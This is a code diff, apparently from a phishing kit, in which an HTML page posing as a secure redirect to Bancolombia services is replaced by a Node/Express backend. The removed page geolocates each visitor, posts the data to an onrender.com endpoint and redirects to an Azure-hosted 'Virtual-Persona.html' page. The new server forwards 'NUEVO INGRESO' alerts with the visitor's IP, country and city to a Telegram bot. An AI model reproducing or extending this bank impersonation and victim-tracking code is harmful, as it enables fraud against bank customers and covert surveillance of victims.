@@ -1,238 +1,81 @@
-<!doctype html>
-<html lang="es">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Redirigiendo… | Mi pagina de ropa</title>
-  <style>
-    /* ... (Todo tu CSS original va aquí, está perfecto) ... */
-    :root {
-      --bg: #f3f6fb;
-      --card-bg: rgba(255, 255, 255, 0.7);
-      --glass-border: rgba(0, 0, 0, 0.06);
-      --accent-1: #4e4e43;
-      --accent-2: #f8e706;
-      --muted: #5b6b79;
-      --shadow: 0 10px 30px rgba(16, 24, 40, 0.08);
-      --radius: 14px;
-      --font-sans: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-    }
-    * { box-sizing: border-box; margin: 0; padding: 0 }
-    html, body { height: 100% }
-    body {
-      background: linear-gradient(180deg, #eef6ff 0%, var(--bg) 100%);
-      font-family: var(--font-sans);
-      color: #0b1a2b;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 24px;
-    }
-    .card {
-      width: min(760px, 96vw);
-      background: linear-gradient(180deg, rgba(255, 255, 255, 0.85), rgba(255, 255, 255, 0.72));
-      border: 1px solid var(--glass-border);
-      border-radius: var(--radius);
-      padding: 36px;
-      box-shadow: var(--shadow);
-      display: flex;
-      gap: 28px;
-      align-items: center;
-    }
-    .left { flex: 1; min-width: 220px; }
-    .brand {
-      display: flex;
-      gap: 12px;
-      align-items: center;
-      margin-bottom: 8px;
-    }
-    .ms-logo {
-      width: 44px;
-      height: 44px;
-      border-radius: 8px;
-      background: linear-gradient(135deg, var(--accent-1), var(--accent-2));
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #fff;
-      font-weight: 700;
-      box-shadow: 0 6px 18px rgba(3, 62, 120, 0.12);
-      flex-shrink: 0;
-      font-family: var(--font-sans);
-    }
-    .title {
-      font-size: 18px;
-      font-weight: 600;
-      color: #05263b;
-      line-height: 1.1;
-    }
-    .subtitle {
-      margin-top: 6px;
-      color: var(--muted);
-      font-size: 13px;
-    }
-    .right {
-      width: 220px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 12px;
-    }
-    .spinner {
-      width: 84px;
-      height: 84px;
-      border-radius: 50%;
-      position: relative;
-      display: grid;
-      place-items: center;
-      background: conic-gradient(from 0deg at 50% 50%, var(--accent-1), rgba(0, 0, 0, 0) 60%);
-      -webkit-mask: radial-gradient(farthest-side, transparent 60%, black 61%);
-      mask: radial-gradient(farthest-side, transparent 60%, black 61%);
-      animation: spin 1.25s linear infinite;
-      box-shadow: 0 8px 20px rgba(3, 62, 120, 0.08);
-    }
-    .spinner::after {
-      content: "";
-      width: 60%;
-      height: 60%;
-      background: linear-gradient(180deg, #fff, #f7fbff);
-      border-radius: 50%;
-      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.6);
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .small-note { font-size: 13px; color: var(--muted); text-align: center; }
-    .countdown {
-      margin-top: 6px;
-      font-weight: 600;
-      color: var(--accent-2);
-      font-size: 13px;
-    }
-    .manual {
-      margin-top: 10px;
-      font-size: 13px;
-    }
-    a.manual-link {
-      color: var(--accent-1);
-      text-decoration: none;
-      font-weight: 600;
-    }
-    a.manual-link:hover { text-decoration: underline; }
-    .ip-display {
-      font-size: 10px;
-      color: var(--muted);
-      margin-top: 5px;
-      font-family: 'Courier New', Courier, monospace;
-    }
-    @media (max-width: 640px) {
-      .card {
-        flex-direction: column;
-        align-items: stretch;
-        padding: 20px
-      }
-      .right {
-        width: 100%;
-        flex-direction: row;
-        justify-content: space-between;
-        align-items: center
-      }
-      .right div[style="text-align:center"] {
-        text-align: left;
-        padding-left: 12px;
-      }
-    }
-  </style>
-</head>
-<body>
-  <div class="card" role="region" aria-labelledby="redir-title" aria-live="polite">
-    <div class="left">
-      <div class="brand" aria-hidden="true">
-        <div class="ms-logo">
-          <img src="https://i.postimg.cc/mrgh8wqk/channels4-jprofile.jpg" alt="Microsoft Logo" style="height:45px;">
-        </div>
-        <div>
-          <div class="title" id="redir-title">En unos momentos serás redirigido</div>
-          <div class="subtitle">Serás redirigido hacia los servicios de Bancolombia.</div>
-        </div>
-      </div>
-      <p style="margin-top:18px; color:var(--muted); font-size:14px; line-height:1.5;">
-        Estamos preparando la conexión segura. Si tu navegador no redirige automáticamente, puedes usar el enlace manual debajo.
-      </p>
-      <p class="manual">
-        Ir ahora:
-        <a class="manual-link" id="manualLink" href="#" target="_self" rel="noopener">Ir a Sucursal Personas</a>
-      </p>
-    </div>
-    <div class="right" aria-hidden="false">
-      <div class="spinner" aria-hidden="true"></div>
-      <div style="text-align:center">
-        <div class="small-note">Cargando conexión segura…</div>
-        <div class="countdown" id="countdown">3</div>
-        <div class="ip-display" id="ipDisplay">IP: ...</div>
-      </div>
-    </div>
-  </div>
+// Importamos los módulos necesarios
+const express = require('express');
+const fetch = require('node-fetch'); // Necesitarás 'node-fetch' v2
+const app = express();
 
-  <script>
-    // --- CONFIGURACIÓN ---
-    const redirectUrl = "https://personassucursalcliente.blob.core.windows.net/proceso/Virtual-Persona.html";
-    const redirectDelayMs = 3000;
-    const backendApiUrl = "https://newbrandly.onrender.com/api/notify";
+app.use(express.json());
 
-    // --- LÓGICA ---
-    document.getElementById('manualLink').href = redirectUrl;
+// Servimos los archivos estáticos (tu index.html)
+// Asegúrate de que tu 'index.html' esté en una carpeta 'public'
+app.use(express.static('public'));
 
-    async function initRedirectAndNotify() {
-      const ipEl = document.getElementById('ipDisplay');
-      try {
-        // *** CAMBIO 1: Usamos una API 'https' gratuita y moderna ***
-        const geoResponse = await fetch('https://ipwho.is/');
-        const geoData = await geoResponse.json();
+// Ruta de la API que llamará el frontend
+app.post('/api/notify', async (req, res) => {
+    
+    // 1. Obtenemos los secretos de las Variables de Entorno de Render
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.CHAT_ID;
 
-        // *** CAMBIO 2: La nueva API devuelve 'ip' (no 'query') ***
-        if (geoData && geoData.ip) {
-          ipEl.textContent = `${geoData.ip}`; // Mostramos la IP
+    // Log de diagnóstico
+    console.log("Recibida petición en /api/notify");
+
+    if (!botToken || !chatId) {
+        console.error("Error Crítico: BOT_TOKEN o CHAT_ID no están configurados en el entorno de Render.");
+        return res.status(500).json({ error: 'Configuración del servidor incompleta' });
+    }
+
+    // 2. Recibimos la estructura de datos de 'ipwho.is'
+    const { ip, country, city, region } = req.body;
+
+    // 3. Limpiamos los datos
+    const ip_visitante = ip || 'Desconocida';
+    const pais = country || 'Desconocido';
+    const ciudad = city || 'Desconocida';
+    // Nota: 'region' es el barrio/estado, lo quitamos del mensaje
+    // pero lo dejamos aquí por si lo quieres usar luego.
+    const barrio_region = region || ''; 
+
+    // *** 4. ¡CAMBIO DE FORMATO! (Tu nueva petición) ***
+    // Usamos ` (backticks) para un mensaje de varias líneas.
+    const message = `NUEVO INGRESO
+IP: ${ip_visitante}
+PAIS: ${pais}
+CIUDAD: ${ciudad}`;
+
+    // 5. Enviamos el mensaje a Telegram
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    try {
+        const telegramResponse = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        });
+        
+        // Leemos la respuesta de Telegram
+        const responseJson = await telegramResponse.json();
+
+        if (!responseJson.ok) {
+            // Si Telegram dice que algo salió mal
+            console.error("Error de la API de Telegram:", responseJson.description);
+            res.status(500).json({ error: responseJson.description });
         } else {
-          ipEl.textContent = `IP: n/a`;
+            console.log("Notificación enviada a Telegram con éxito.");
+            res.status(200).json({ status: 'success' });
         }
 
-        // *** CAMBIO 3: Ahora SÍ se ejecuta esta llamada al backend ***
-        fetch(backendApiUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(geoData) // Enviamos todos los datos de 'ipwho.is'
-        }).catch(err => console.error("Error al notificar al backend:", err));
-
-      } catch (error) {
-        console.error("Error al geolocalizar:", error);
-        ipEl.textContent = 'IP: Error';
-      }
-
-      // 4. Iniciar el countdown (Tu lógica original)
-      const countdownEl = document.getElementById('countdown');
-      let remaining = Math.ceil(redirectDelayMs / 1000);
-      countdownEl.textContent = remaining;
-
-      const interval = setInterval(() => {
-        remaining = remaining - 1;
-        if (remaining <= 0) {
-          countdownEl.textContent = '0';
-          clearInterval(interval);
-        } else {
-          countdownEl.textContent = remaining;
-        }
-      }, 1000);
-
-      // 5. Redirigir (Tu lógica original)
-      setTimeout(() => {
-        window.location.replace(redirectUrl);
-      }, redirectDelayMs);
+    } catch (error) {
+        // Error de red
+        console.error("Error de red al intentar enviar a Telegram:", error.message);
+        res.status(500).json({ error: 'Falló la conexión con Telegram' });
     }
+});
 
-    initRedirectAndNotify();
-  </script>
-</body>
-</html>
+// Iniciamos el servidor en el puerto que Render nos asigne
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Servidor escuchando en el puerto ${PORT}`);
+});
